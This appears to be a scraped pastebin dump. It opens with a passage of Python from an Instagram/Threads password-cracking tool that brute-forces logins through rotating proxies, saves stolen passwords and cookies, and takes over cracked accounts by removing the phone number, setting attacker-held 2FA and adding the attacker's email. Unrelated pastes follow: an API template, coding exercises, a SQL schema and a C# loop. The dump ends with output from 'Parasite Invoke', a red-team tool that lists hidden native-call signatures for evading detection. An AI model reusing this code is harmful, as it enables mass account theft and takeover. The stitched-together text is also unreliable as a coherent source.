                            #RePassd  = Require().RePassword(passwd, ''.join(str(random.choice('abcdefghij@kdddez_-sess_-trrffrdd')) for i in range(8)), cookie)
                            #OnRd = f'{passwd}' if RePassd is None else f'{RePassd}'
                            num = Require().DeltPhone(cookie)
                            statp, pone = num['Dihapus'], num['Number']
                            deleted = f'{pone} Di Hapus' if statp is True else f'{pone} Tidak Di Hapus'
                            two = Require().Aktifkan2F(cookie)
                            kode, key, statf = two['kode-pemulihan'], two['SecretKey'], two['success-a2f']
                            stat2fa = 'Di Aktifkan' if statf is not False else 'Tidak Aktif'
                            Temp = Require().AddMail(cookie)
                            email, state, inbx = Temp['email'], Temp['di-konfirmasi'], Temp['Url']
                            statd = 'Di Konfirmasi' if state is True else 'Tidak Di Konfirmasi'
                            tree = Tree(f'\r╭ logged in user',style='green')
                            true = tree.add(f'Succes logged {fullname}')
                            true.add(f'Username {username}')
                            true.add(f'Password {passwd}')
                            true = tree.add(f'\r╭ informasi profiles',style='green')
                            true.add(f'Followers {follower}')
                            true.add(f'Following {followed}')
                            true.add(f'Postingan {feedpost}')
                            true = tree.add(f'\r╭ auth secure account',style='green')
                            true.add(f'stats two {stat2fa}')
                            true.add(f'screetkey {key}')
                            true.add(f'pemulihan {kode}')  
                            true.add(f'telephone {deleted}')   
                            true.add(f'add email {email} {statd}')
                            true.add(f'web email {inbx}')
                            tree.add(f'Cookie {cookie}')
                            printz(tree)
                            save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{stat2fa}|{key}|{kode}|{deleted}|{email} {statd}|{inbx}|{cookie}\n'
                        except Exception as e:
                            print(e)
                            tree = Tree(f'\r╭ logged in user',style='green')
                            true = tree.add(f'Succes logged {fullname}')
                            true.add(f'Username {username}')
                            true.add(f'Password {passwd}')
                            true = tree.add(f'\r╭ informasi profiles',style='green')
                            true.add(f'Followers {follower}')
                            true.add(f'Following {followed}')
                            true.add(f'Postingan {feedpost}')
                            tree.add(f'Cookie {cookie}')
                            printz(tree)
                            save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}\n'
                    else:
                        tree = Tree(f'\r╭ logged in user',style='green')
                        true = tree.add(f'Succes logged {fullname}')
                        true.add(f'Username {username}')
                        true.add(f'Password {passwd}')
                        true = tree.add(f'\r╭ informasi profiles',style='green')
                        true.add(f'Followers {follower}')
                        true.add(f'Following {followed}')
                        true.add(f'Postingan {feedpost}')
                        tree.add(f'Cookie {cookie}')
                        printz(tree)
                        save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}\n'
                    with open('/sdcard/OK/'+self.result_ok,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break       
                elif 'two_factor_required' in str(response):
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    tree = Tree('\r╭ logged two factor                ',style='red')
                    true = tree.add(f'Gagal logged {fullname}')
                    true.add(f'Username {username}')
                    true.add(f'Password {passwd}')
                    true = tree.add(f'\r╭ informasi profiles',style='red')
                    true.add(f'Followers {follower}')
                    true.add(f'Following {followed}')
                    true.add(f'Postingan {feedpost}')
                    printz(tree)
                    save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
                    self.faktor+=1
                    with open('/sdcard/2F/'+self.result_two,'a') as wr:
                        wr.write(save)
                        wr.close()   
                    break 
                elif 'https://i.instagram.com/challenge/' in str(response):
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    tree = Tree('\r╭ logged challenge                ',style='yellow')
                    true = tree.add(f'Gagal logged {fullname}')
                    true.add(f'Username {username}')
                    true.add(f'Password {passwd}')
                    true = tree.add(f'\r╭ informasi profiles',style='yellow')
                    true.add(f'Followers {follower}')
                    true.add(f'Following {followed}')
                    true.add(f'Postingan {feedpost}')
                    printz(tree)
                    save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
                    self.chekpoint+=1
                    with open('/sdcard/CP/'+self.result_cp,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break    
                elif 'ip_block' in str(response):
                    Console().print(f""[bold grey50]   ──>[bold red] HIDUPKAN MODE PESAWAT 5 DETIK!"", end='\r')
                    time.sleep(3.5)     
                else:
                    continue   
            except (KeyboardInterrupt, requests.exceptions.ConnectionError, requests.exceptions.TooManyRedirects):
                Console().print(f""[bold grey50]   ──>[bold red] KONEKSI ERROR!"", end='\r')
                time.sleep(31)
                self.ExecAjax(username, password)
        self.looping+=1
        
    def ExecAjax_Threads(self, username, password):
        byps = requests.Session()
        try: Console().print(f""[bold grey50]   ──>[bold white] Crack[bold green] {str(username)[:15]}[bold grey50]/[bold white]{'{:.0%}'.format(self.looping/float(len(dump)))}[bold grey50]/[bold white]{str(len(dump))}[bold grey50]/[bold white]{self.looping}[bold grey50]/[bold white] OK:-[bold green]{self.success}[bold white] CP:-[bold red]{self.chekpoint}[bold white] 2F:-[bold red]{self.faktor}[bold white]     "", end='\r')
        except (ZeroDivisionError) as e:
            Console().print(f""[bold grey50]   ──>[bold red] {str(e).upper()}!"", end='\r')
            time.sleep(3.5)
        while True:
            try:
                curl = byps.get('https://www.threads.net/accounts/onetap/?next=%2F&hl=en', allow_redirects=True)
                headers = {
                    'Host': 'www.instagram.com',
                    'content-length': str(random.randint(2000,2999)),
                    'x-ig-app-id': '1217981644879628',
                    'x-instagram-ajax': '1011794706',
                    'user-agent': Useragent().useragent_ajax(),
                    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                    'x-asbd-id': '129477',
                    'dpr': '2',
                    'x-csrftoken': curl.cookies.get('csrftoken',None),
                    'accept': '*/*',
                    'origin': 'https://www.threads.net',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-dest': 'document',
                    'referer': 'https://www.threads.net/?hl=en',
                    'accept-encoding': 'gzip, deflate',
                    'accept-language': 'en-US;q=0.8,en;q=0.9'
                }
                break
            except (requests.exceptions.ConnectionError):
                Console().print(f""[bold grey50]   ──>[bold red] KONEKSI ERROR!"", end='\r')
                time.sleep(5)
                self.ExecApi(username, password)
            except (Exception) as e:
                Console().print(f""[bold grey50]   ──>[bold red] {str(e).upper()}!"", end='\r')
                time.sleep(3.5)
                self.ExecAjax_Threads(username, password)
        for passwd in password:
            try:          
                payload = {
                    'enc_password': Requre().enc_password(passwd),
                    'optIntoOneTap':'false',
                    'queryParams':json.dumps({""hl"":""en""}),
                    'trustedDeviceRecords':'{}',
                    'username': username,
                }
                proxs = {'http': 'socks5://'+random.choice(Requ().Socksku())}
                response = byps.post('https://www.threads.net/api/v1/web/accounts/login/ajax/', data = payload, headers = headers, proxies = proxs, allow_redirects=True).text
                self.result_ok, self.result_two, self.result_cp = self.Simpan_Result()
                if 'userId' in str(response):
                    self.success+=1
                    try: cookie = (';'.join(['%s=%s'%(name, value) for name, value in byps.cookies.get_dict().items()]))
                    except (Exception) as e: cookie = (None)
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    if 'ya' in self.amankan_akun:
                        try:
                            #RePassd  = Require().RePassword(passwd, ''.join(str(random.choice('abcdefghij@kdddez_-sess_-trrffrdd')) for i in range(8)), cookie)
                            #OnRd = f'{passwd}' if RePassd is None else f'{RePassd}'
                            num = Require().DeltPhone(cookie)
                            statp, pone = num['Dihapus'], num['Number']
                            deleted = f'{pone} Di Hapus' if statp is True else f'{pone} Tidak Di Hapus'
                            two = Require().Aktifkan2F(cookie)
                            kode, key, statf = two['kode-pemulihan'], two['SecretKey'], two['success-a2f']
                            stat2fa = 'Di Aktifkan' if statf is not False else 'Tidak Aktif'
                            Temp = Require().AddMail(cookie)
                            email, state, inbx = Temp['email'], Temp['di-konfirmasi'], Temp['Url']
                            statd = 'Di Konfirmasi' if state is True else 'Tidak Di Konfirmasi'
                            tree = Tree(f'\r╭ logged in user',style='green')
                            true = tree.add(f'Succes logged {fullname}')
                            true.add(f'Username {username}')
                            true.add(f'Password {passwd}')
                            true = tree.add(f'\r╭ informasi profiles',style='green')
                            true.add(f'Followers {follower}')
                            true.add(f'Following {followed}')
                            true.add(f'Postingan {feedpost}')
                            true = tree.add(f'\r╭ auth secure account',style='green')
                            true.add(f'stats two {stat2fa}')
                            true.add(f'screetkey {key}')
                            true.add(f'pemulihan {kode}')  
                            true.add(f'telephone {deleted}')   
                            true.add(f'add email {email} {statd}')
                            true.add(f'web email {inbx}')
                            tree.add(f'Cookie {cookie}')
                            printz(tree)
                            save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{stat2fa}|{key}|{kode}|{deleted}|{email} {statd}|{inbx}|{cookie}\n'
                        except Exception as e:
                            print(e)
                            tree = Tree(f'\r╭ logged in user',style='green')
                            true = tree.add(f'Succes logged {fullname}')
                            true.add(f'Username {username}')
                            true.add(f'Password {passwd}')
                            true = tree.add(f'\r╭ informasi profiles',style='green')
                            true.add(f'Followers {follower}')
                            true.add(f'Following {followed}')
                            true.add(f'Postingan {feedpost}')
                            tree.add(f'Cookie {cookie}')
                            printz(tree)
                            save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}\n'
                    else:
                        tree = Tree(f'\r╭ logged in user',style='green')
                        true = tree.add(f'Succes logged {fullname}')
                        true.add(f'Username {username}')
                        true.add(f'Password {passwd}')
                        true = tree.add(f'\r╭ informasi profiles',style='green')
                        true.add(f'Followers {follower}')
                        true.add(f'Following {followed}')
                        true.add(f'Postingan {feedpost}')
                        tree.add(f'Cookie {cookie}')
                        printz(tree)
                        save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}\n'
                    with open('/sdcard/OK/'+self.result_ok,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break       
                elif 'two_factor_required' in str(response):
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    tree = Tree('\r╭ logged two factor                ',style='red')
                    true = tree.add(f'Gagal logged {fullname}')
                    true.add(f'Username {username}')
                    true.add(f'Password {passwd}')
                    true = tree.add(f'\r╭ informasi profiles',style='red')
                    true.add(f'Followers {follower}')
                    true.add(f'Following {followed}')
                    true.add(f'Postingan {feedpost}')
                    printz(tree)
                    save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
                    self.faktor+=1
                    with open('/sdcard/2F/'+self.result_two,'a') as wr:
                        wr.write(save)
                        wr.close()   
                    break 
                elif 'https://i.instagram.com/challenge/' in str(response):
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    tree = Tree('\r╭ logged challenge                ',style='yellow')
                    true = tree.add(f'Gagal logged {fullname}')
                    true.add(f'Username {username}')
                    true.add(f'Password {passwd}')
                    true = tree.add(f'\r╭ informasi profiles',style='yellow')
                    true.add(f'Followers {follower}')
                    true.add(f'Following {followed}')
                    true.add(f'Postingan {feedpost}')
                    printz(tree)
                    save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
                    self.chekpoint+=1
                    with open('/sdcard/CP/'+self.result_cp,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break    
                elif 'ip_block' in str(response):
                    Console().print(f""[bold grey50]   ──>[bold red] HIDUPKAN MODE PESAWAT 5 DETIK!"", end='\r')
                    time.sleep(3.5)     
                else:
                    continue   
            except (KeyboardInterrupt, requests.exceptions.ConnectionError, requests.exceptions.TooManyRedirects):
                Console().print(f""[bold grey50]   ──>[bold red] KONEKSI ERROR!"", end='\r')
                time.sleep(31)
                self.ExecAjax_Threads(username, password)
        self.looping+=1
        
"
i1qg4Azf,Air AI Post template,updown,JavaScript,Thursday 7th of March 2024 03:26:47 PM CDT,"let Timestamp = new Date().toISOString(); // creates a Timestamp
let Webhook = ""https://api.air.ai/v1/calls"";
let Method = ""POST"";
const token = ""YOUR_VALUE_HERE""

// creates the JSON Object to send with the key/value pairs
const payload = {
  ""promptId"": YOUR_NUMBER_HERE,
  ""phone"": inputData.phoneNumber,
  ""name"": inputData.name
};


// creates the Method, Headers, and Body of the HTTP POST Request
let Options = {
     method: Method,
     headers: {
          'Content-Type': ""application/json"",
          ""Authorization"": ""Bearer "" + token
     },
     body: JSON.stringify(payload)
}

const Request = await fetch(Webhook, Options); // HTTP POST Request
const Response = await Request.json(); // HTTP POST Response

output = {Response, Request, Webhook, Method, Timestamp}"
e0YwbmHr,Untitled,smj007,Python,Thursday 7th of March 2024 03:15:52 PM CDT,"class RandomizedCollection:

    def __init__(self):
        self.hashmap = defaultdict(set)
        self.list = []
        
    def insert(self, val: int) -> bool:

        self.hashmap[val].add(len(self.list))
        self.list.append(val)
        return len(self.hashmap[val]) == 1
        
    def remove(self, val: int) -> bool:
        if self.hashmap[val]:
            indexes = self.hashmap[val]
            index = indexes.pop()
           
            last = self.list[-1]
            self.list[index] = last

            self.hashmap[last].add(index)
            self.hashmap[last].remove(len(self.list)-1)

            self.list.pop()
            return True
        return False

    def getRandom(self) -> int:
        return random.choice(self.list)
        


# Your RandomizedCollection object will be instantiated and called as such:
# obj = RandomizedCollection()
# param_1 = obj.insert(val)
# param_2 = obj.remove(val)
# param_3 = obj.getRandom()"
EbLXM5nf,class House,miklik,Python,Thursday 7th of March 2024 02:47:29 PM CDT,"# Knihovny
import turtle

# Screen
screen = turtle.Screen()
screen.title(""Turtle OOP"")
screen.setup(1.0,1.0)
print(screen.screensize())

# Želva
t = turtle.Turtle()
t.shape(""turtle"")

# Třída House
class House:
  '''
  Nakresli domek
  '''
  def __init__(self,zelva,sirka=75,x=0,y=0,color=""black""):
    self.zelva = zelva
    self.sirka = sirka
    self.x = x
    self.y = y
    self.color = color
  
  def draw(self,zelva,sirka=75,x=0,y=0,color=""black""):
    self.zelva = zelva
    self.sirka = sirka
    if x != 0: self.x = x
    if y != 0: self.y = y
    self.color = color
    zelva.penup()
    zelva.setx(self.x)
    zelva.sety(self.y)
    zelva.pendown()
    zelva.pencolor(color)
    for i in range(4):
      zelva.forward(sirka)
      zelva.right(90)
    zelva.left(45)
    zelva.forward(53)
    zelva.right(90)
    zelva.forward(53)
    zelva.left(45)
    zelva.penup()

# Instance
house1 = House(t)
house2 = House(t)

# Kreslení
house1.draw(t)
t.forward(50)
house2.draw(t,x=100)

# Bez konce
screen.mainloop()

"
WR3uzEAY,# tk_centralizing_art.py,here2share,Python,Thursday 7th of March 2024 02:43:56 PM CDT,"# tk_centralizing_art.py

import tkinter as tk
import random
import math
from PIL import Image, ImageTk, ImageDraw

WINDOW_WIDTH = 600
WINDOW_HEIGHT = 600
CX, CY = WINDOW_WIDTH // 2, WINDOW_HEIGHT // 2
ROCK_COUNT = PAPER_COUNT = SCISSORS_COUNT = 400
EDGE_AVOID_RADIUS = 20
REPULSION_RADIUS = 100
SPEED = 1

def offset(t=1.5):
    return random.uniform(-t, t)

def avoid_edges():
    x0 = min(WINDOW_WIDTH - EDGE_AVOID_RADIUS, max(x, EDGE_AVOID_RADIUS))
    y0 = min(WINDOW_HEIGHT - EDGE_AVOID_RADIUS, max(y, EDGE_AVOID_RADIUS))
    return x0, y0

def movement(x, y, target_x, target_y):
    angle = math.atan2(y - target_y, x - target_x) + if_rev
    x += SPEED * math.cos(angle + offset())
    y += SPEED * math.sin(angle + offset())
    return x, y

def distance_to(x1, y1, x2, y2):
    return math.sqrt((x1 - x2)**2 + (y1 - y2)**2)

root = tk.Tk()
root.title(""tk_centralizing_art"")
root.geometry(""%dx%d+%d+%d"" % (WINDOW_WIDTH, WINDOW_HEIGHT, 10, 10))

pil_image = Image.new('RGB', (WINDOW_WIDTH, WINDOW_HEIGHT), color='white')
draw = ImageDraw.Draw(pil_image)

canvas = tk.Canvas(root, width=WINDOW_WIDTH, height=WINDOW_HEIGHT, bg=""white"")
canvas.pack()

tribe_color = {
    ""rock"": ""red"",
    ""paper"": ""lime"",
    ""scissors"": ""black""
}

chase = {
    ""rock"": ""scissors"",
    ""scissors"": ""paper"",
    ""paper"": ""rock"",
}

cxy = {
    ""rock"": """",
    ""scissors"": """",
    ""paper"": """"
}

food_chain = '{rock} > {scissors} > {paper} > {rock}'.format_map(tribe_color)

def draw_entity(x, y, entity):
    color = tribe_color[entity]
    draw.ellipse((x - 2, y - 2, x + 2, y + 2), fill=color, outline=color)

P = 200
def start(event=0):
    global entities
    entities = [(random.randint(-P, WINDOW_WIDTH + P), random.randint(-P, WINDOW_HEIGHT + P), ""rock"") for _ in range(ROCK_COUNT)]
    entities += [(random.randint(-P, WINDOW_WIDTH + P), random.randint(-P, WINDOW_HEIGHT + P), ""paper"") for _ in range(PAPER_COUNT)]
    entities += [(random.randint(-P, WINDOW_WIDTH + P), random.randint(-P, WINDOW_HEIGHT + P), ""scissors"") for _ in range(SCISSORS_COUNT)]
    random.shuffle(entities)

start()
root.bind(""<space>"", start)

while True:
	# draw.rectangle((0, 0, WINDOW_WIDTH, WINDOW_HEIGHT), fill='white')

	for j in '.'*P:
		for i, (x, y, entity) in enumerate(entities):
			x0, y0 = CX, CY
			if_rev = math.pi
			x, y = movement(x, y, x0, y0)
			draw_entity(x, y, entity)
			entities[i] = (x, y, entity)

		photo_image = ImageTk.PhotoImage(pil_image)

		canvas.create_image(0, 0, anchor='nw', image=photo_image)
		root.update()
	start()"
8wdDVSV3,news_site,Radoslav_03,MySQL,Thursday 7th of March 2024 02:41:42 PM CDT,"CREATE DATABASE newsDB;
USE newsDB;

CREATE TABLE news_categories (
	id INT NOT NULL AUTO_INCREMENT PRIMARY KEY,
	name VARCHAR(200)
);

CREATE TABLE news (
	id INT NOT NULL AUTO_INCREMENT PRIMARY KEY,
    title VARCHAR(100) NOT NULL,
    content TEXT NOT NULL,
    publish_date DATE NOT NULL,
    
    category_id INT UNIQUE NOT NULL,
    CONSTRAINT FOREIGN KEY(category_id) REFERENCES news_categories(id)
);

CREATE TABLE images (
	id INT NOT NULL AUTO_INCREMENT PRIMARY KEY,
    url TEXT NOT NULL,
    
    news_id INT UNIQUE NOT NULL,
    CONSTRAINT FOREIGN KEY (news_id) REFERENCES news(id)
);

CREATE TABLE videos (
	id INT NOT NULL AUTO_INCREMENT PRIMARY KEY,
    url TEXT NOT NULL,
    
    news_id INT UNIQUE NOT NULL,
    CONSTRAINT FOREIGN KEY (news_id) REFERENCES news(id)
);

CREATE TABLE users (
	id INT NOT NULL AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(50) NOT NULL,
    email VARCHAR(100) NOT NULL,
    password VARCHAR(200) NOT NULL,
    role ENUM(""Admin"", ""Editor"", ""Reader"")
);

CREATE TABLE users_news (
	user_id INT UNIQUE NOT NULL,
    news_id INT UNIQUE NOT NULL,
    
    CONSTRAINT FOREIGN KEY(user_id) REFERENCES users(id),
    CONSTRAINT FOREIGN KEY(news_id) REFERENCES news(id),
    PRIMARY KEY(user_id, news_id)
);

CREATE TABLE comments (
	id INT NOT NULL AUTO_INCREMENT PRIMARY KEY,
    content TEXT NOT NULL,
    published_date DATE NOT NULL,
    
    news_id INT UNIQUE NOT NULL,
    user_id INT UNIQUE NOT NULL,
    
    CONSTRAINT FOREIGN KEY(news_id) REFERENCES news(id),
    CONSTRAINT FOREIGN KEY(user_id) REFERENCES users(id)
);

CREATE TABLE user_activity (
	id INT NOT NULL AUTO_INCREMENT PRIMARY KEY,
    user_action ENUM(""Login"", ""Comment"", ""Delete account""),
    timestampp TIMESTAMP,
    
    user_id INT UNIQUE NOT NULL,
    CONSTRAINT FOREIGN KEY(user_id) REFERENCES users(id)
);"
iBeTbXCw,Untitled,AttackingDirectory,Bash,Thursday 7th of March 2024 02:35:19 PM CDT,"PS A:\SSD\ProjectsVS\Parasite Invoke\Parasite Invoke\bin\Debug> & '.\Parasite Invoke.exe' --path C:\ -r --method VirtualAlloc


     . .  .  .  . . .
   .                  .                  _.-/`/`'-._
   . Nice assembly :D .                /_..--''''_-'
    .  .  .  .      .`                //-.__\_\.-'
                `..'  _\\\//  --.___ // ___.---.._
                  _- /@/@\  \       ||``          `-_
                .'  ,\_\_/   |    \_||_/      ,-._   `.
               ;   { o    /   }     ""        `-._`.   ;
              ;     `-==-'   /                    \_|   ;
             |        |>o<|  }@@@}                       |
             |       <(___<) }@@@@}                      |
             |       <(___<) }@@@@@}                     |
             |        <\___<) \_.?@@}                    |
              ;         V`--V`__./@}                    ;
               \      tx      ooo@}                    /
                \                                     /
                 `.                                 .'
                   `-._          Parasite Invoke_.-'
                       ``------'''''''''------``


                Michael Zhmaylo (github.com/MzHmO)
-------------
[FILE] C:\Program Files\dotnet\shared\Microsoft.WindowsDesktop.App\6.0.15\UIAutomationClientSideProviders.dll

Method: VirtualAlloc
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Program Files\dotnet\shared\Microsoft.WindowsDesktop.App\6.0.15\UIAutomationClientSideProviders.dll"");
        Type t = asm.GetType(""MS.Win32.UnsafeNativeMethods"", true);
        var methodInfo = t.GetMethod(""VirtualAlloc"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { IntPtr address, UIntPtr size, int allocationType, int protect });
        ===END SIGNATURE===
-------------
-------------
[FILE] C:\Program Files\dotnet\shared\Microsoft.WindowsDesktop.App\6.0.15\WindowsBase.dll

Method: VirtualAlloc
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Program Files\dotnet\shared\Microsoft.WindowsDesktop.App\6.0.15\WindowsBase.dll"");
        Type t = asm.GetType(""MS.Win32.UnsafeNativeMethods"", true);
        var methodInfo = t.GetMethod(""VirtualAlloc"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { IntPtr lpAddress, UIntPtr dwSize, int flAllocationType, int flProtect });
        ===END SIGNATURE===
-------------
-------------
[FILE] C:\Program Files\dotnet\shared\Microsoft.WindowsDesktop.App\6.0.21\UIAutomationClientSideProviders.dll

Method: VirtualAlloc
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Program Files\dotnet\shared\Microsoft.WindowsDesktop.App\6.0.21\UIAutomationClientSideProviders.dll"");
        Type t = asm.GetType(""MS.Win32.UnsafeNativeMethods"", true);
        var methodInfo = t.GetMethod(""VirtualAlloc"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { IntPtr address, UIntPtr size, int allocationType, int protect });
        ===END SIGNATURE===
-------------
-------------
[FILE] C:\Program Files\dotnet\shared\Microsoft.WindowsDesktop.App\6.0.21\WindowsBase.dll

Method: VirtualAlloc
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Program Files\dotnet\shared\Microsoft.WindowsDesktop.App\6.0.21\WindowsBase.dll"");
        Type t = asm.GetType(""MS.Win32.UnsafeNativeMethods"", true);
        var methodInfo = t.GetMethod(""VirtualAlloc"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { IntPtr lpAddress, UIntPtr dwSize, int flAllocationType, int flProtect });
        ===END SIGNATURE===
-------------
-------------
[FILE] C:\Program Files\dotnet\shared\Microsoft.WindowsDesktop.App\7.0.10\UIAutomationClientSideProviders.dll

Method: VirtualAlloc
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Program Files\dotnet\shared\Microsoft.WindowsDesktop.App\7.0.10\UIAutomationClientSideProviders.dll"");
        Type t = asm.GetType(""MS.Win32.UnsafeNativeMethods"", true);
        var methodInfo = t.GetMethod(""VirtualAlloc"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { IntPtr address, UIntPtr size, int allocationType, int protect });
        ===END SIGNATURE===
-------------
-------------
[FILE] C:\Program Files\dotnet\shared\Microsoft.WindowsDesktop.App\7.0.10\WindowsBase.dll

Method: VirtualAlloc
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Program Files\dotnet\shared\Microsoft.WindowsDesktop.App\7.0.10\WindowsBase.dll"");
        Type t = asm.GetType(""MS.Win32.UnsafeNativeMethods"", true);
        var methodInfo = t.GetMethod(""VirtualAlloc"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { IntPtr lpAddress, UIntPtr dwSize, int flAllocationType, int flProtect });
        ===END SIGNATURE===
-------------"
Cxs3S7sr,Untitled,Abdula_2314124,C#,Thursday 7th of March 2024 02:32:41 PM CDT,"using System;

namespace Metho
{
    class Program
    {
        static void Main(string[] args)
        {
            Reload(10);
        }

        // максКількість патронів - i = кількість патронів яка залишилися до повної перезарядки
        static void Reload(int countPatron)
        {
            for (int i = 0; i < countPatron; i++)
            {
                Console.WriteLine($""Залишилось {countPatron - i} патронів"");
                Console.WriteLine($""Теперешня кількість патронів {i}"");
            }

            Console.WriteLine(""Перезарядка закінчена"");
        }
    }
}
"
9JyjcMAH,Untitled,AttackingDirectory,Bash,Thursday 7th of March 2024 02:32:20 PM CDT,"PS A:\SSD\ProjectsVS\Parasite Invoke\Parasite Invoke\bin\Debug> & '.\Parasite Invoke.exe' --path C:\Windows\System32 -r


     . .  .  .  . . .
   .                  .                  _.-/`/`'-._
   . Nice assembly :D .                /_..--''''_-'
    .  .  .  .      .`                //-.__\_\.-'
                `..'  _\\\//  --.___ // ___.---.._
                  _- /@/@\  \       ||``          `-_
                .'  ,\_\_/   |    \_||_/      ,-._   `.
               ;   { o    /   }     ""        `-._`.   ;
              ;     `-==-'   /                    \_|   ;
             |        |>o<|  }@@@}                       |
             |       <(___<) }@@@@}                      |
             |       <(___<) }@@@@@}                     |
             |        <\___<) \_.?@@}                    |
              ;         V`--V`__./@}                    ;
               \      tx      ooo@}                    /
                \                                     /
                 `.                                 .'
                   `-._          Parasite Invoke_.-'
                       ``------'''''''''------``


                Michael Zhmaylo (github.com/MzHmO)
-------------
[FILE] C:\Windows\System32\DriverStore\FileRepository\cui_dch.inf_amd64_2e49f48165b8de10\igfxSDKLib.dll
-------------
-------------
[FILE] C:\Windows\System32\DriverStore\FileRepository\cui_dch.inf_amd64_2e49f48165b8de10\GfxDownloadWrapper.exe
-------------
-------------
[FILE] C:\Windows\System32\DriverStore\FileRepository\cui_dch.inf_amd64_aa8c460a9b7cf2b9\igfxSDKLib.dll
-------------
-------------
[FILE] C:\Windows\System32\DriverStore\FileRepository\cui_dch.inf_amd64_aa8c460a9b7cf2b9\GfxDownloadWrapper.exe
-------------
-------------
[FILE] C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\AGS.dll
-------------
-------------
[FILE] C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\LiteDB.dll
-------------
-------------
[FILE] C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\Newtonsoft.Json.dll
-------------
-------------
[FILE] C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\Newtonsoft.Json.Schema.dll
-------------
-------------
[FILE] C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\NLog.dll

Method: LogonUser
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\NLog.dll"");
        Type t = asm.GetType(""NLog.Internal.NativeMethods"", true);
        var methodInfo = t.GetMethod(""LogonUser"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { string pszUsername, string pszDomain, string pszPassword, int dwLogonType, int dwLogonProvider, IntPtr& phToken });
        ===END SIGNATURE===

Method: CloseHandle
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\NLog.dll"");
        Type t = asm.GetType(""NLog.Internal.NativeMethods"", true);
        var methodInfo = t.GetMethod(""CloseHandle"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr handle });
        ===END SIGNATURE===

Method: DuplicateToken
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\NLog.dll"");
        Type t = asm.GetType(""NLog.Internal.NativeMethods"", true);
        var methodInfo = t.GetMethod(""DuplicateToken"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr existingTokenHandle, int impersonationLevel, IntPtr& duplicateTokenHandle });
        ===END SIGNATURE===

Method: OutputDebugString
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\NLog.dll"");
        Type t = asm.GetType(""NLog.Internal.NativeMethods"", true);
